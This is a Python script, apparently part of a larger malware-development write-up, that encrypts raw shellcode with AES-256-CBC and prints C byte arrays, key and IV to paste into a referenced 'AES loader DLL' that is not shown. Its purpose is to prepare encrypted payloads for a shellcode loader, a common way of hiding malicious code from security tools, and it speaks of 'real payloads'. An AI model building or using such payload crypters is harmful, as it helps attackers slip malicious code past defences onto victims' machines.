#!/usr/bin/env python3
"""
encrypt_aes256.py — Encrypt shellcode with AES-256-CBC (PKCS7 padding)
for use with the self-contained AES loader DLL above.

Usage:
    python encrypt_aes256.py payload.bin
    python encrypt_aes256.py payload.bin --gen-keys
    python encrypt_aes256.py payload.bin --key <64hex> --iv <32hex> -o encrypted.h
"""

import sys
import os
import hashlib
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


def format_c_byte_array(data: bytes, bytes_per_line: int = 16, indent: str = "    ") -> str:
    """Format bytes as a multi-line C array body (no surrounding braces)."""
    lines = []
    for i in range(0, len(data), bytes_per_line):
        chunk = data[i:i + bytes_per_line]
        hex_part = ", ".join(f"0x{b:02X}" for b in chunk)
        # trailing comma on every line keeps diffs/edits clean and is valid C
        lines.append(f"{indent}{hex_part},")
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="Encrypt shellcode for self-contained AES-256-CBC loader"
    )
    parser.add_argument("input", help="Raw shellcode binary file")
    parser.add_argument("--key", help="AES-256 key as 64 hex chars", default=None)
    parser.add_argument("--iv", help="AES IV as 32 hex chars", default=None)
    parser.add_argument(
        "--gen-keys",
        action="store_true",
        help="Generate random key and IV",
    )
    parser.add_argument("--output", "-o", help="Output C header file")
    parser.add_argument(
        "--bytes-per-line",
        type=int,
        default=16,
        help="Bytes per line in C array output (default: 16)",
    )
    args = parser.parse_args()

    with open(args.input, "rb") as f:
        shellcode = f.read()

    print(f"[+] Read {len(shellcode)} bytes from {args.input}")

    if args.gen_keys:
        key = get_random_bytes(32)
        iv = get_random_bytes(16)
        print("[+] Generated random AES-256 key and IV")
    elif args.key and args.iv:
        key = bytes.fromhex(args.key.replace(" ", "").replace("0x", ""))
        iv = bytes.fromhex(args.iv.replace(" ", "").replace("0x", ""))
    else:
        # Default keys from the DLL (testing only)
        key = bytes(
            [
                0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
                0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C,
                0x76, 0x2E, 0x71, 0x60, 0xF3, 0x8B, 0x45, 0x6D,
                0xF5, 0x3A, 0x67, 0x6C, 0x4D, 0xA1, 0xBC, 0xDE,
            ]
        )
        iv = bytes(
            [
                0x5A, 0xE6, 0x1B, 0x3C, 0x8F, 0x72, 0x4D, 0x90,
                0x17, 0xBE, 0x23, 0x48, 0xE9, 0x0C, 0x65, 0xFA,
            ]
        )
        print("[!] Using DEFAULT key/IV from the DLL (TESTING ONLY)")
        print("[!] Use --gen-keys or --key/--iv for real payloads")

    assert len(key) == 32, f"Key must be 32 bytes, got {len(key)}"
    assert len(iv) == 16, f"IV must be 16 bytes, got {len(iv)}"

    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(shellcode, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)

    print(
        f"[+] Encrypted: {len(shellcode)} -> {len(ciphertext)} bytes "
        f"(AES-256-CBC + PKCS7)"
    )

    array_body = format_c_byte_array(ciphertext, bytes_per_line=args.bytes_per_line)

    header_comment = (
        f"// Encrypted shellcode: {len(shellcode)} bytes plain -> "
        f"{len(ciphertext)} bytes AES-256-CBC with PKCS7 padding\n"
        f"// Key: {key.hex()}\n"
        f"// IV:  {iv.hex()}\n"
    )

    output = (
        f"{header_comment}"
        f"static const unsigned char kEncryptedShellcode[] = {{\n"
        f"{array_body}\n"
        f"}};\n"
        f"static const SIZE_T kEncryptedSize = sizeof(kEncryptedShellcode);\n"
    )

    if args.output:
        with open(args.output, "w", newline="\n") as f:
            f.write(output)
        print(f"[+] Written to {args.output}")
    else:
        print("\n--- Paste this into aes256_loader_dll.cpp ---\n")
        print(output)

    key_body = format_c_byte_array(key, bytes_per_line=16, indent="    ")
    iv_body = format_c_byte_array(iv, bytes_per_line=16, indent="    ")

    print("\n--- Key/IV C arrays (paste into DLL source) ---")
    print(f"static const unsigned char kAesKey[32] = {{\n{key_body}\n}};")
    print(f"static const unsigned char kAesIv[16] = {{\n{iv_body}\n}};")

    sha = hashlib.sha256(ciphertext).hexdigest()
    print(f"\n[+] SHA256(encrypted_blob) = {sha}")

    verify_cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_padded = verify_cipher.decrypt(ciphertext)
    try:
        decrypted = unpad(decrypted_padded, AES.block_size)
        if decrypted == shellcode:
            print("[+] Self-test: decryption verified OK")
        else:
            print("[-] Self-test: MISMATCH!")
    except Exception as e:
        print(f"[-] Self-test failed: {e}")


if __name__ == "__main__":
    main()